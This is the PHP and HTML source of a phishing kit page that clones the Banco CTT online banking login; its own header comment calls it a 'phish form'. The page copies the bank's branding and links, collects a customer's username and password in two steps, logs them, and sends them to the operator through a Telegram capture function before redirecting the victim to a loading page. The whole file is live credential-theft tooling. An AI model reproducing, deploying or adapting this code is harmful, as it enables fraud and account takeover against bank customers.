<?php
// ============================================================
//  index.php — Step 1: Login (Banco CTT Online clone)
//  Two tabs: Particulares (phish form) + Empresas (corp iframe)
// 
// ============================================================
require_once 'config.php';

$ip = client_ip();
init_state($ip, 'login');

// Handle AJAX login submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = safe_input('username');
    $password = safe_input('password');

    if (strlen($username) < 2 || strlen($password) < 2) {
        json_response(array('status' => 'error', 'message' => 'Preencha todos os campos.'));
    }

    $data = array(
        'username' => $username,
        'password' => $password
    );

    log_capture('LOGIN', $ip, $data);
    send_telegram_capture('LOGIN', '🔐 Login Credentials', $ip, $data);
    update_state_step($ip, 'login', $data);

    json_response(array('status' => 'ok', 'redirect' => 'loading.php'));
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex">
<meta name="description" content="Banco CTT - Banco Online">
<title>Banco CTT | Iniciar sessão</title>
<link rel="icon" href="https://www.bancoctt.pt/application/themes/images/icons/favicon-32x32.png" type="image/x-icon">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:'Open Sans','Segoe UI',Arial,Helvetica,sans-serif;color:#222;background:#fff;-webkit-font-smoothing:antialiased}
/* Red diagonal V decoration */
.vline{position:fixed;inset:0;z-index:0;pointer-events:none}
.vline svg{width:100%;height:100%;display:block}
.vline path{stroke:#df0024;stroke-width:9;fill:none;filter:drop-shadow(0 0 14px rgba(223,0,36,.30))}
.page{position:relative;z-index:1;display:flex;flex-direction:column;min-height:100vh}
/* Header */
.header{background:#fff;padding:20px 40px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #efefef}
.logo{height:44px;width:auto;display:block;max-width:220px;object-fit:contain}
.logo-fallback{font-size:26px;font-weight:700;color:#222;letter-spacing:-.5px}
.logo-fallback b{color:#df0024;font-weight:800}
/* Main */
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:44px 32px 72px}
.wrap{display:flex;gap:72px;align-items:center;justify-content:center;max-width:1080px;width:100%}
.left{flex:1;max-width:520px}
.left h1{font-size:34px;line-height:1.25;font-weight:700;color:#222;margin-bottom:10px}
.left .sub{font-size:17px;color:#696969;margin-bottom:28px;line-height:1.5}
.tip{background:#f3f5f7;border-radius:8px;padding:16px 18px;display:flex;gap:12px;align-items:flex-start;max-width:460px}
.tip .shield{flex:0 0 auto;margin-top:2px}
.tip b{display:block;font-size:12.5px;color:#222;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px}
.tip p{font-size:13px;color:#555;line-height:1.5}
.tip a{color:#df0024;text-decoration:none;font-weight:600}
.tip a:hover{text-decoration:underline}
/* Login card */
.card{width:420px;max-width:100%;background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:34px 34px 26px;box-shadow:0 2px 14px rgba(0,0,0,.05)}
.card h2{font-size:22px;font-weight:700;margin-bottom:20px;color:#222}
.stage{display:none}
.stage.active{display:block;animation:fadeIn .35s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.field{margin-bottom:16px}
.field label{display:block;font-size:13.5px;font-weight:600;color:#333;margin-bottom:7px}
.field input[type=text]{width:100%;height:44px;border:1px solid #cccccc;border-radius:6px;padding:0 12px;font-size:15px;color:#222;outline:none;transition:border .15s,box-shadow .15s;background:#fff}
.field input[type=text]:focus{border-color:#df0024;box-shadow:0 0 0 3px rgba(223,0,36,.13)}
/* Buttons */
.btn{width:100%;height:44px;border:0;border-radius:6px;cursor:pointer;font-size:15px;font-weight:700;transition:background .15s}
.btn:disabled{background:#fbdce2;color:#c97a88;cursor:not-allowed}
.btn[disabled]{background:#fbdce2;color:#c97a88;cursor:not-allowed}
.btn-red{background:#df0024;color:#fff}
.btn-red:hover:not(:disabled){background:#c20022}
.btn-ghost{width:100%;height:40px;border:1px solid #f2b9c2;border-radius:6px;background:#fff;color:#df0024;font-size:14px;font-weight:600;cursor:pointer;transition:border .15s,background .15s;display:flex;align-items:center;justify-content:center;gap:8px;text-decoration:none;margin-top:10px}
.btn-ghost:hover{border-color:#df0024;background:#fff5f6}
.or{display:flex;align-items:center;gap:12px;color:#999;font-size:13px;margin:16px 0}
.or:before,.or:after{content:"";flex:1;height:1px;background:#e6e6e6}
.channels{border:1px dashed #d9d9d9;border-radius:8px;padding:12px 14px;display:flex;gap:12px;align-items:center;cursor:pointer;text-decoration:none;background:#fff;transition:border .15s;margin-top:6px}
.channels:hover{border-color:#df0024;border-style:solid}
.channels .ic{flex:0 0 auto;display:flex;align-items:center;justify-content:center;width:34px;height:34px;border-radius:50%;background:#fbeef0}
.channels span{font-size:13.5px;font-weight:700;color:#df0024}
/* Stage 2 */
.back{display:inline-flex;align-items:center;gap:6px;font-size:13.5px;font-weight:600;color:#444;text-decoration:none;margin-bottom:14px;background:none;border:0;cursor:pointer}
.back:hover{color:#df0024}
.user-echo{display:flex;align-items:center;gap:10px;background:#f7f7f7;border:1px solid #e6e6e6;border-radius:6px;padding:11px 13px;font-size:14px;font-weight:600;color:#333;margin-bottom:18px}
.pw-holder{margin-bottom:18px}
.pw-label{display:block;font-size:13.5px;font-weight:600;color:#333;margin-bottom:7px}
.pw-hint{font-size:12.5px;color:#888;margin-bottom:12px}
.pw-row{display:flex;gap:7px}
.pw-cell{flex:1;display:flex;flex-direction:column;align-items:center;min-width:0}
.pw-box{width:100%;height:46px;border:1px solid #cccccc;border-radius:6px;text-align:center;font-size:20px;font-weight:600;color:#222;background:#fff;outline:none;transition:border .15s,box-shadow .15s;padding:0}
.pw-box:focus{border-color:#df0024;box-shadow:0 0 0 3px rgba(223,0,36,.14)}
.pw-num{font-size:10.5px;color:#8a8a8a;margin-top:5px}
/* Error */
.err{display:none;align-items:flex-start;gap:8px;background:#fdecee;border:1px solid #f5c6cc;color:#b00020;border-radius:6px;padding:10px 12px;font-size:13px;margin-bottom:14px;line-height:1.4}
.err.show{display:flex}
/* Overlay */
.overlay{position:fixed;inset:0;background:rgba(255,255,255,.84);z-index:50;display:none;align-items:center;justify-content:center;flex-direction:column;gap:14px}
.overlay.on{display:flex}
.spin{width:42px;height:42px;border:4px solid #fbdce2;border-top-color:#df0024;border-radius:50%;animation:rot .8s linear infinite}
@keyframes rot{to{transform:rotate(360deg)}}
.overlay p{color:#555;font-size:14px;font-weight:600}
/* Footer */
.footer{background:#fafafa;border-top:1px solid #ececec;padding:14px 40px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
.f-links{display:flex;gap:22px;list-style:none;flex-wrap:wrap}
.f-links a{color:#00a19a;font-size:13px;font-weight:600;text-decoration:none}
.f-links a:hover{text-decoration:underline}
.lang{display:flex;align-items:center;gap:7px;color:#555;font-size:13px;font-weight:600}
@media(max-width:960px){
  .wrap{flex-direction:column;gap:32px}
  .left{max-width:100%;text-align:left}
  .tip{max-width:100%}
  .card{width:100%}
  .header,.footer{padding-left:20px;padding-right:20px}
}
</style>
</head>
<body>

<!-- Red diagonal V (fixed background decoration) -->
<div class="vline" aria-hidden="true">
  <svg viewBox="0 0 1920 1017" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
    <path d="M 969 -12 L 641 897 L -12 651"/>
  </svg>
</div>

<div class="page">

  <header class="header">
    <a href="https://www.bancoctt.pt/" target="_blank" rel="noopener" style="display:block" title="Banco CTT">
      <img id="logoImg" class="logo" src="https://thebanks.eu/img/logos/Banco_CTT.png"
           onerror="logoFallback(1)" alt="Banco CTT">
    </a>
  </header>

  <main class="main">
    <div class="wrap">

      <!-- Left panel -->
      <div class="left">
        <h1>Bem-vindo ao seu banco,<br>à sua medida</h1>
        <p class="sub">Digital, flexível e sempre ao seu alcance.</p>
        <div class="tip">
          <span class="shield">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 2L4 5v6c0 5 3.4 9.7 8 11 4.6-1.3 8-6 8-11V5l-8-3z" fill="#df0024"/>
              <path d="M9.2 11.6l2 2 3.6-3.8" stroke="#fff" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </span>
          <div>
            <b>Dica de segurança</b>
            <p>A sua palavra-passe é pessoal e intransmissível. Nunca a partilhe com ninguém.
               <a href="https://www.bancoctt.pt/home/seguranca" target="_blank" rel="noopener">Saber mais</a></p>
          </div>
        </div>
      </div>

      <!-- Right panel: login card -->
      <div class="card">
        <h2>Iniciar sessão</h2>

        <div id="errMsg" class="err" role="alert">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="flex:0 0 auto;margin-top:1px">
            <circle cx="12" cy="12" r="10" stroke="#b00020" stroke-width="1.8"/>
            <path d="M12 7.5v6" stroke="#b00020" stroke-width="1.9" stroke-linecap="round"/>
            <circle cx="12" cy="16.6" r="1.1" fill="#b00020"/>
          </svg>
          <span id="errTxt"></span>
        </div>

        <!-- Stage 1: username -->
        <div id="stage1" class="stage active">
          <div class="field">
            <label for="username">Nome de utilizador</label>
            <input type="text" id="username" name="username" autocomplete="off" autocapitalize="none"
                   spellcheck="false" maxlength="64" placeholder="Introduza o seu nome de utilizador">
          </div>
          <button type="button" id="btnCont1" class="btn btn-red" disabled>Continuar</button>
          <a class="btn-ghost" href="https://homebanking.bancoctt.pt/login.html" target="_blank" rel="noopener">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
              <path d="M12 3L2 8l10 5 10-5-10-5z" fill="#df0024"/>
              <path d="M6 10.5v4.2c0 1 2.7 2.8 6 2.8s6-1.8 6-2.8v-4.2" stroke="#df0024" stroke-width="1.6" fill="none" stroke-linecap="round"/>
            </svg>
            Recuperar nome de utilizador
          </a>
          <div class="or">ou</div>
          <a class="channels" href="https://homebanking.bancoctt.pt/login.html" target="_blank" rel="noopener">
            <span class="ic">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="3" y="4" width="18" height="14" rx="2" stroke="#df0024" stroke-width="1.7"/>
                <path d="M8 22h8M12 18v4" stroke="#df0024" stroke-width="1.7" stroke-linecap="round"/>
              </svg>
            </span>
            <span>Ativar os Canais Digitais</span>
          </a>
        </div>

        <!-- Stage 2: password (8 blank boxes) -->
        <div id="stage2" class="stage">
          <button type="button" id="backBtn" class="back">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none">
              <path d="M15 5l-7 7 7 7" stroke="currentColor" stroke-width="2.1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            Voltar
          </button>

          <div class="user-echo">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="8" r="4" fill="#9b9b9b"/>
              <path d="M4 20c1.6-3.4 4.6-5 8-5s6.4 1.6 8 5" stroke="#9b9b9b" stroke-width="2" fill="none" stroke-linecap="round"/>
            </svg>
            <span id="userEcho"></span>
          </div>

          <div class="pw-holder">
            <label class="pw-label" for="pw0">Palavra-passe</label>
            <p class="pw-hint">Por favor, introduza a sua palavra-passe.</p>
            <div class="pw-row" id="pwRow">
              <div class="pw-cell"><input type="password" id="pw0" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="1.ª posição"><span class="pw-num">1.ª</span></div>
              <div class="pw-cell"><input type="password" id="pw1" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="2.ª posição"><span class="pw-num">2.ª</span></div>
              <div class="pw-cell"><input type="password" id="pw2" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="3.ª posição"><span class="pw-num">3.ª</span></div>
              <div class="pw-cell"><input type="password" id="pw3" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="4.ª posição"><span class="pw-num">4.ª</span></div>
              <div class="pw-cell"><input type="password" id="pw4" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="5.ª posição"><span class="pw-num">5.ª</span></div>
              <div class="pw-cell"><input type="password" id="pw5" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="6.ª posição"><span class="pw-num">6.ª</span></div>
              <div class="pw-cell"><input type="password" id="pw6" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="7.ª posição"><span class="pw-num">7.ª</span></div>
              <div class="pw-cell"><input type="password" id="pw7" class="pw-box pw-cell-input" autocomplete="off" maxlength="1" aria-label="8.ª posição"><span class="pw-num">8.ª</span></div>
            </div>
          </div>

          <button type="button" id="btnCont2" class="btn btn-red" disabled>Continuar</button>
          <a class="btn-ghost" href="https://homebanking.bancoctt.pt/login.html" target="_blank" rel="noopener">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
              <path d="M12 3L2 8l10 5 10-5-10-5z" fill="#df0024"/>
              <path d="M6 10.5v4.2c0 1 2.7 2.8 6 2.8s6-1.8 6-2.8v-4.2" stroke="#df0024" stroke-width="1.6" fill="none" stroke-linecap="round"/>
            </svg>
            Recuperar palavra-passe
          </a>
        </div>

      </div>
    </div>
  </main>

  <footer class="footer">
    <ul class="f-links">
      <li><a href="https://www.bancoctt.pt/home/seguranca" target="_blank" rel="noopener">Guia de segurança</a></li>
      <li><a href="https://www.bancoctt.pt/home/form-contacto" target="_blank" rel="noopener">Contactos</a></li>
      <li><a href="https://www.bancoctt.pt/home/onde-estamos" target="_blank" rel="noopener">Onde estamos</a></li>
    </ul>
    <span class="lang">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="9" stroke="#00a19a" stroke-width="1.7"/>
        <ellipse cx="12" cy="12" rx="4" ry="9" stroke="#00a19a" stroke-width="1.4"/>
        <path d="M3.5 9h17M3.5 15h17" stroke="#00a19a" stroke-width="1.4"/>
      </svg>
      Português
    </span>
  </footer>

</div>

<!-- Spinner overlay -->
<div id="overlay" class="overlay">
  <div class="spin"></div>
  <p>A processar...</p>
</div>

<script>
function logoFallback(stage){
  var img = document.getElementById('logoImg');
  if (!img) return;
  if (stage === 1) {
    img.onerror = function(){ logoFallback(2); };
    img.src = 'https://www.bancoctt.pt/application/themes/images/bancoctt.png';
  } else {
    var span = document.createElement('span');
    span.className = 'logo-fallback';
    span.innerHTML = 'Banco<b>CTT</b>';
    img.parentNode.replaceChild(span, img);
  }
}

(function(){
  var stage1 = document.getElementById('stage1');
  var stage2 = document.getElementById('stage2');
  var user   = document.getElementById('username');
  var echo   = document.getElementById('userEcho');
  var btn1   = document.getElementById('btnCont1');
  var btn2   = document.getElementById('btnCont2');
  var boxes  = Array.prototype.slice.call(document.querySelectorAll('.pw-box'));
  var err    = document.getElementById('errMsg');
  var errTxt = document.getElementById('errTxt');
  var overlay= document.getElementById('overlay');
  var N = boxes.length;

  function showErr(m){ errTxt.textContent = m; err.classList.add('show'); }
  function hideErr(){ err.classList.remove('show'); }

  /* ---------- stage 1 ---------- */
  function upd1(){ btn1.disabled = user.value.trim().length === 0; }
  user.addEventListener('input', function(){ upd1(); hideErr(); });
  user.addEventListener('keydown', function(e){
    if (e.key === 'Enter') { e.preventDefault(); btn1.click(); }
  });

  /* ---------- stage transitions ---------- */
  function go1(){
    stage2.classList.remove('active');
    stage1.classList.add('active');
    hideErr();
    user.focus();
  }
  function go2(){
    echo.textContent = user.value.trim();
    stage1.classList.remove('active');
    stage2.classList.add('active');
    hideErr();
    boxes[0].focus();
  }
  document.getElementById('backBtn').addEventListener('click', function(e){
    e.preventDefault(); go1();
  });

  btn1.addEventListener('click', function(){
    if (btn1.disabled) return;
    var v = user.value.trim();
    if (v.length < 2) { showErr('O nome de utilizador deve ter pelo menos 2 caracteres.'); return; }
    go2();
  });

  /* ---------- stage 2 boxes ---------- */
  function getPwd(){ return boxes.map(function(b){ return b.value; }).join(''); }
  function upd2(){ btn2.disabled = getPwd().length === 0; }

  function fillFrom(start, text){
    var s = start, i = 0;
    for (; i < text.length && s < N; i++, s++){ boxes[s].value = text.charAt(i); }
    if (s < N){ boxes[s].focus(); } else { boxes[N-1].focus(); }
    upd2(); hideErr();
  }

  boxes.forEach(function(b, i){
    b.addEventListener('input', function(){
      hideErr();
      if (b.value.length > 1){
        var rest = b.value;
        b.value = rest.charAt(0);
        fillFrom(i + 1, rest.slice(1));
        return;
      }
      if (b.value.length === 1 && i < N - 1){ boxes[i + 1].focus(); }
      upd2();
    });
    b.addEventListener('keydown', function(e){
      if (e.key === 'Backspace'){
        if (b.value === '' && i > 0){
          e.preventDefault();
          boxes[i - 1].value = '';
          boxes[i - 1].focus();
          upd2();
        }
      } else if (e.key === 'ArrowLeft' && i > 0){
        e.preventDefault(); boxes[i - 1].focus();
      } else if (e.key === 'ArrowRight' && i < N - 1){
        e.preventDefault(); boxes[i + 1].focus();
      } else if (e.key === 'Enter'){
        e.preventDefault(); btn2.click();
      }
    });
    b.addEventListener('paste', function(e){
      e.preventDefault();
      var txt = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\s+/g, '');
      fillFrom(i, txt);
    });
  });

  /* Autofill / password-manager guard: if a box ever receives >1 char, spread it */
  setInterval(function(){
    boxes.forEach(function(b, i){
      if (b.value.length > 1){
        var rest = b.value;
        b.value = rest.charAt(0);
        fillFrom(i + 1, rest.slice(1));
      }
    });
  }, 500);

  /* ---------- submit ---------- */
  function submit(){
    var pwd = getPwd();
    if (pwd.length < 2){ showErr('Por favor, introduza a sua palavra-passe.'); return; }
    overlay.classList.add('on');
    var body = new URLSearchParams();
    body.append('username', user.value.trim());
    body.append('password', pwd);
    fetch('index.php', {
      method: 'POST',
      body: body,
      headers: { 'X-Requested-With': 'XMLHttpRequest' }
    })
    .then(function(r){ return r.json(); })
    .then(function(d){
      overlay.classList.remove('on');
      if (d.status === 'ok' && d.redirect){ location.href = d.redirect; }
      else { showErr(d.message || 'Ocorreu um erro. Tente novamente.'); }
    })
    .catch(function(){
      overlay.classList.remove('on');
      showErr('Ocorreu um erro. Tente novamente.');
    });
  }

  btn2.addEventListener('click', function(){ if (!btn2.disabled) submit(); });

  upd1(); upd2();
})();
</script>
</body>
</html>
